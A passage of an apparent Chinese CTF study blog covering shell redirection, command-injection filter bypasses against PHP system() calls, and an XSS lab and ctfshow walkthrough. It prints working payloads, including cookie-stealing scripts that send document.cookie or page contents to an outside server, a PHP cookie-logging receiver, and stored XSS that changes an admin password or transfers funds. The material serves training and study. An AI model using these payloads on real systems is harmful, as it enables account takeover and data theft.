1，也就是标准输出，符号的右边可以是一个文件，也可以是一个输出设备。当使用&gt;时，会判断右边的文件存不存在，如果存在的话就覆盖，不存在的话则直接创建。但是当使用&gt;&gt;进行追加时，则不会删除原来已经存在的文件。</p><p>root@en1sksyfamnufy5g:~/Desktop# tree<br>.<br>└── a.txt</p><p>0 directories, 1 file<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt<br>ls: cannot access ‘b.txt’: No such file or directory<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ^C<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>在我们执行<code>ls a.txt b.txt</code>之后，一共有两种输出，其中<code>ls:</code>无法访问 b.txt: 没有那个文件或目录是错误输出，a.txt 是标准输出。</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 1&gt;out<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;&gt;out<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>将原来的标准输出重定向到了 out 文件中，所以控制台只剩下了错误提示。并且当执行了追加操作时，out 文件的内容非但没有被清空，反而又多了一条 a.txt。下面我们将错误输出重定向到文件中：</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 2&gt;err<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;out 2&gt;err<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access ‘b.txt’: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><ol start="2"><li>输入</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &lt;filename</td><td align="center">以 filename 文件作为标准输入</td></tr><tr><td align="center">command 0&lt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &lt;&lt;delimiter</td><td align="center">从标准输入中读入，直到遇到 delimiter 分隔符</td></tr></tbody></table><blockquote><p>使用&lt;对<strong>输入</strong>做重定向，如果符号左边没有写值，那么默认就是 0。以 cat 命令为例，如果 cat 后面没有跟文件名的话，那它的作用就是将标准输入（比如键盘）回显到标准输出（比如屏幕）上：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat<br>123<br>123<br>test<br>test</p><p>让 cat 读取一个文件，我们利用输入重定向：</p><p>root@en1sksyfamnufy5g:~/Desktop# cat a.txt<br>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>我们可以看看上一次的 cat out 的内容是 a.txt</p><p>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;&lt;end</p><p>&gt;hhh<br>&gt;end<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>当我们输入完<code>cat &gt;out &lt;&lt;end</code>，然后敲下回车之后，命令并没有结束，此时 cat 命令像一开始一样，等待你给它输入数据。然后当我们敲入 end 之后，cat 命令就结束了。end 之前输入的字符都已经被写入到了 out 文件中。这就是输入分割符的作用。</p></blockquote><p>回到<code>&gt;/dev/null 2&gt;&amp;1</code> 可以分为两部分</p><p><code>&gt;/dev/null</code></p><p>这条命令的作用是将标准输出 1 重定向到<code>/dev/null</code>中。 <code>/dev/null</code>代表 linux 的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了<code>&gt;/dev/null</code>之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。</p><p><code>2&gt;&amp;1</code></p><p>这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，说人话就是错误输出将会和标准输出输出到同一个地方。</p><p>linux 在执行 shell 命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以<code>&gt;/dev/null 2&gt;&amp;1</code>的作用就是让标准输出重定向到<code>/dev/null</code>中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了<code>/dev/null</code>中，错误输出同样也被丢弃了。执行了这条命令之后，该条 shell 命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。</p><p>回到题目，我们知道%0a 是换行 那么构造 payload 如：</p><blockquote><p>?c=cat flag.php%0a</p></blockquote><p>在终端就会这样</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php<br>flag{……}<br>root@en1sksyfamnufy5g:~/Desktop# &gt;/dev/null 2&gt;&amp;1<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>还可以利用分号</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt<br>hello</p><p>all seems fine<br>root@en1sksyfamnufy5g:~/Desktop# tac 1.txt<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt;tac 1.txt<br>hello</p><p>all seems fine<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>payload：</p><blockquote><p>?c=cat flag.php;ls</p><p>这样命令就成为</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php;ls &gt;/dev/null 2&gt;&amp;1</p><p>…</p></blockquote><p>还有<code>||</code> <code>&amp;&amp;</code></p><ul><li>过滤了大量命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>/bin</code>: bin 为 binary 的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar 等。</li><li><code>/usr/bin</code>:主 要放置一些应用软体工具的必备执行档例如 c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget 等。</li><li><code>/sbin</code>: 主 要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown 等。</li><li><code>/usr/sbin</code>:放置一些网路管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump 等。</li></ul></blockquote><p>所以利用通配符就可以绕过，比如 cat</p><blockquote><p>?c=/bin/ca?${IFS}f???????</p></blockquote><p>当然还有漏网之鱼可以利用</p><blockquote><p>grep${IFS}show${IFS}fla?.php</p></blockquote><ul><li>过滤所有小写字母</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Ⅰ、如上所述，可以利用<code>目录+通配符匹配特殊含数字命令</code>绕过正则对函数的匹配 现在是小写字母不能出现，在 bin 目录下可以找到 base64</p><blockquote><p>下面两种用法等价：</p><p>root@en1sksyfamnufy5g:~/Desktop# base64 flag.php</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php | base64</p></blockquote><p>payload:</p><blockquote><p>?c=/???/????64 flag.php</p></blockquote><p>在/usr/bin 下可以找到 bzip2，先将 flag.php 文件进行压缩，然后再将其下载</p><blockquote><p>?c=/???/???/???2 flag.php</p><p>curl -O http://…/flag.php.bz2</p></blockquote><ul><li>无字母数字</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Ⅱ、利用临时文件</p><p>可以向 php 上传一个 shell 文件，php 会将其保存为<code>/tmp/phpxxxxxx</code>文件名最后 6 个字符是随机的大小写字母</p><p>可以利用通配符<code>/???/php??????</code> <code>/*/?????????</code>或<code>/???/?????????</code>但是这种匹配的准确性不高</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"></p><p>我们加入准确性更高的正则匹配 可见只有临时文件包含有大写字母</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell</a></p><p>构造临时文件最后一位是大写的 payload<code>/???/?????????[@-[]</code></p><p>(php 生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png"></p><blockquote><p>source 命令：</p><p>source 命令也称为“点命令”，也就是一个点符号（.）。</p><p>source 命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</p><p>用法：</p><p>source filename 或 . filename</p><p>source 命令除了上述的用途之外，还有一个另外一个用途。在对编译系统核心时常常需要输入一长串的命令，如：</p><p>make mrproper</p><p>make menuconfig</p><p>make dep</p><p>make clean</p><p>make bzImage</p><p>…………</p><p>如果把这些命令做成一个文件，让它自动顺序执行，对于需要多次反复编译系统核心的用户来说会很方便，而用 source 命令就可以做到这一点，它的作用就是把一个文件的内容当成 shell 来执行，先在 linux 的源代码目录下（如/usr/src/linux-2.4.20）建立一个文件，如 make_command，在其中输入一下内容：</p><p>make mrproper &amp;&amp;</p><p>make menuconfig &amp;&amp;</p><p>make dep &amp;&amp;</p><p>make clean &amp;&amp;</p><p>make bzImage &amp;&amp;</p><p>make modules &amp;&amp;</p><p>make modules_install &amp;&amp;</p><p>cp arch/i386/boot/bzImage /boot/vmlinuz_new &amp;&amp;</p><p>cp System.map /boot &amp;&amp;</p><p>vi /etc/lilo.conf &amp;&amp;</p><p>lilo -v</p><p>文件建立好之后，每次编译核心的时候，只需要在/usr/src/linux-2.4.20 下输入：</p><p>source make_command</p><p>即可，如果你用的不是 lilo 来引导系统，可以把最后两行去掉，配置自己的引导程序来引导内核。</p><p>顺便补充一点，&amp;&amp;命令表示顺序执行由它连接的命令，但是只有它之前的命令成功执行完成了之后才可以继续执行它后面的命令。</p><p>通过<code>.</code>去执行 sh 命令不需要有执行权限</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112747397.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112814014.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815115542123.png"></p><p>能否使用 sess 上传进度</p><ul><li>shell 数字构造</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>shell 下各变量的含义</p><p>${_} =”” //返回上一次命令<br>$((${_}))=0<br>$((~$((${_}))))=-1</p></blockquote><p>payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">num = <span class="hljs-string">&quot;$((~$((&quot;</span>+<span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span>+<span class="hljs-string">&quot;))))&quot;</span>//<span class="hljs-number">36</span><br><span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS笔记</title>
    <link href="/2021/07/21/XSS%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/07/21/XSS%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>更改 test 为 2 成功显示 2</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161249161.png"></p><p>输入<code>&lt;script&gt;&lt;/script&gt;</code>没有显示 按理来说应该会出现欢迎用户<code>&lt;script&gt;&lt;/script&gt;</code>才对，但是没有，到哪里去了，他被浏览器解析了，在这个标签中就可以插入你想执行的 js 代码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231844489.png"></p><p>需要弹窗才能下一关</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721231540223.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721160805637.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232021324.png"></p><p>有输入框 直接插入失败 在查看器看一下源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161841692.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721232250230.png"></p><p>发现上面的文字内容被 html 实体化编码了，但是下面输入框里还会显示原内容，但是在 value 值内浏览器无法解析，把 value 属性闭合，再把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>”逃逸出去“ ==&gt; 构造<code>&gt;&quot;&lt;script&gt;&lt;/script&gt;//</code>, <code>//</code>是为了注释后面原有的<code>&gt;&quot;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721161733218.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210721162035732.png"></p><p>发现连 value 值里的内容都被实体化编码了，所以，我们需要尝试其他办法来执行 js 代码，我们可以发现我们传入的值是在 input 标签中的，而标签都有属性，我们可以给他添加一个属性，利用这个属性来执行 js 代码,双引号闭合失败就尝试单引号闭合 value</p><blockquote><p>‘onmouseover=’javascript:alert(1)</p><p>‘onmouseover=’alert(1)’</p></blockquote><p>这里 onmouseover 是嵌入到 input 中的一个属性，他的作用是鼠标滑过时执行 javascript 代码，成功绕过。</p><p>还有 onclick，他的作用是点击时执行</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>和前一关不同的是使用了双引号进行闭合</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113402660.png"></p><p>script 被插进了下划线 说明匹配了&lt;script&gt; 双写 大小写可以尝试 都行不通</p><p>换个标签试一试</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724113621774.png"></p><p>同样构造闭合</p><blockquote><p>“&gt;&lt;a href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724115942750.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>测试发现第五关的基础上对 herf 进行了匹配 进行大小写绕过</p><blockquote><p>“&gt;&lt;a Href=javascript:alert(1)&gt;click on&lt;/a&gt;</p></blockquote><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>第五关提到的双写这里出现了<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724223917009.png"></p><p>可以看到提交后标签里的 script 不再是插入下划线 而是替换为空 那么尝试双写<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724224133906.png"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225137053.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225156651.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225227736.png"></p><p>点击链接后</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225301905.png"></p><p>原来 javascript 被过滤了 可以将这个进行编码绕过 比如将最后一个字符进行编码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724225948421.png"></p><p>得到<code>javascrip&amp;#116:alert()</code>放入框里添加链接 然后点击链接即可</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>无论什么都是链接不合法 看一下 wp 说需要<code>http://</code> 而且不能因为有<code>http://</code>影响注入</p><p>那么就注释掉</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231259786.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210724231254317.png"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224553446.png"></p><p>直接插入不行 查看源码发现有三个 input 是 hidden 的 分别传参如下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224355595.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224412941.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726224450585.png"></p><blockquote><p>t_sort=” type=”text” onmouseover=alert() “</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230555125.png"></p><p>鼠标划过文本框</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210726230610328.png"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>仍然使用上一关的方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728171409093.png"></p><p>发现被实例化 这个 t_ref 参数怎么利用 url 里传好像传不进去</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728173918864.png"></p><p>但是从这里可以发现 ref 应该是 refer</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174023540.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174042560.png"></p><p>一传进去就是出现文本框了<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174109292.png"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174639889.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174626300.png"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>理所当然的<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728174839524.png"></p><p>额没有反应 抓包！<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210728211436470.png"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013507101.png"></p><p>被替换为空格 注意空格和空字符不一样 尝试了大小写无效</p><p>尝试图片标签</p><blockquote><p>keyword=&lt;img src=1 οnerrοr=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802013807695.png"></p><p>可见 空格被实体化了 %0a 绕过</p><blockquote><p>&lt;img%0asrc=1%0aonerror=alert()&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210802014135142.png"></p><h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><p>xss 平台代码插入后提示不是管理员，说明我们不能插自己，得插管理员</p><p>payload：</p><blockquote><p>&lt;scrpit&gt;document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie\">http://vps/getcookie.php?cookie=&#39;+document.cookie\</a>&lt;/script&gt;</p><p>&lt;body onload=”document.location.href=’<a href="http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\">http://vps/getcookie.php?cookie=&#39;+document.cookie&quot;&gt;\</a>&lt;/body&gt;</p></blockquote><p>getcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Cookie</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$Cookie</span>))&#123;<br><span class="hljs-variable">$action</span> = fopoen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;The file create failed!&quot;</span>);<br>fwrite(<span class="hljs-variable">$action</span>,<span class="hljs-variable">$Cookie</span>,<span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$Cookie</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The Cookie has dump!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Nothing input!&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>ctfshow328</li></ul><p>查看功能点，注册，登录，均不能查看到 flag，需要管理员登录</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195236357.png"></p><p>我们注册一个密码获得 cookie</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195756121.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195828394.png"></p><p>在浏览器伪造一下 cookie，我们只看到了一闪而过的页面，然后就到了我们脚本的回显，说面是执行成功的，我们抓包看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200724719.png"></p><p>对比得知，这里还有请求包才对，我们要抓取这个请求包，并且防止它跳转</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021195949954.png"></p><p>询问出题人得知，这里采用了 database，js 获取 ajax，所以说明这里发包后还有一个包没有获得，我们直接在 proxy 模块一个一个抓</p><p>在发送了管理员 cookie 后，把第一个包放掉，把 js 请求 ajax 请求的包抓取下来</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200228393.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021200412268.png"></p><p>可以从控制台的性能(启用高级绘制插桩，设置 cpu 和网络倍速)里面查看到一闪而过的画面，我们在时间轴可以看到</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021210045312.png"></p><p>此时还有一个请求</p><ul><li>ctfshow 329</li></ul><p>登录后就注销掉当前 cookie，从而没有办法用所获得的 cookie 进行登录，我们直接 xss 读取源码发送到 vps 上接受</p><p>先在表中插入一个数据，然后控制台尝试输出他的属性，为后面构造 payload 做准备</p><p>这里使用了 jquery 的遍历</p><blockquote><p>&lt;script&gt;$(‘.laytable-cell-1-0-1’).each(function(index,value){if(value.innerHTML.indexOf(‘ctf’+’show{‘)&gt;-1){window.location.href=”<a href="http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;%7D%7D);%5C">http://49.233.34.67/app/get.php?cookie=&quot;+value.innerHTML;}});\</a>&lt;/script&gt;</p></blockquote><ul><li>ctfshow 330、331</li></ul><p>有个修改密码的功能，抓包<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024144417192.png"></p><p>很自然的想法就是让管理员发出这个包，然后以 123456 登录即可</p><p>注册一个密码</p><blockquote><p>&lt;script&gt;window.location.href=’<a href="http://127.0.0.1/api/change.php?p=123456&#39;;\">http://127.0.0.1/api/change.php?p=123456&#39;;\</a>&lt;/script&gt;</p></blockquote><p>没有用，再看一看题目很贴心的告诉你应该放在用户名里<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211024145254601.png"></p><p>用 admin-123456 成功登录</p><ul><li>ctfshow332</li></ul><p>注册登录一个账号，给 admin 转账-10000 即可(有毒，我怎么搞都是有内鬼)</p><p>终于成功了</p><ul><li>ctfshow333</li></ul><p>332 的基础上不能转负数了</p><p>可以给自己转，每次的转账金额不能大于当前的金额</p><p>比如：转账 1 元，bp 抓一下，爆破 1000 次(1005），再改一下转账参数为 1000，爆破 10 次</p><p>或者：</p><p>注册两个账号，其中一个账号的账号为：</p><blockquote><p>&lt;script&gt; $.ajax({url:’<a href="http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\">http://127.0.0.1/api/amount.php&#39;,type:&#39;post&#39;,data:{u:&#39;1&#39;,a:&#39;10000&#39;}});\</a>&lt;/script&gt;</p></blockquote><h2 id="xss-的攻防："><a href="#xss-的攻防：" class="headerlink" title="xss 的攻防："></a>xss 的攻防：</h2><h3 id="常用-HTML-标签"><a href="#常用-HTML-标签" class="headerlink" title="常用 HTML 标签"></a>常用 HTML 标签</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">iframe</span>&gt;    <span class="hljs-selector-tag">iframe</span> 元素会创建包含另一个文档的内联框架。<br><br>&lt;<span class="hljs-selector-tag">textarea</span>&gt;   <span class="hljs-selector-tag">textarea</span> 标签定义多行的文本输入控件<br><br>&lt;<span class="hljs-selector-tag">img</span>&gt;        <span class="hljs-selector-tag">img</span>  元素向网页中嵌入图像。<br><br>&lt;script&gt;     script 标签用于定义客户端脚本，比如javascript.<br>             script 元素既可以包含脚本语句，也可以通过 <span class="hljs-attribute">src</span> 属性指向外部脚本文件。<br>             必须的 type 属性规定脚本的 MIME 类型<br>             javascript 的常见应用是图像操作、表单验证以及动态内容更新。<br></code></pre></td></tr></table></figure><h3 id="常用-javascript-方法"><a href="#常用-javascript-方法" class="headerlink" title="常用 javascript 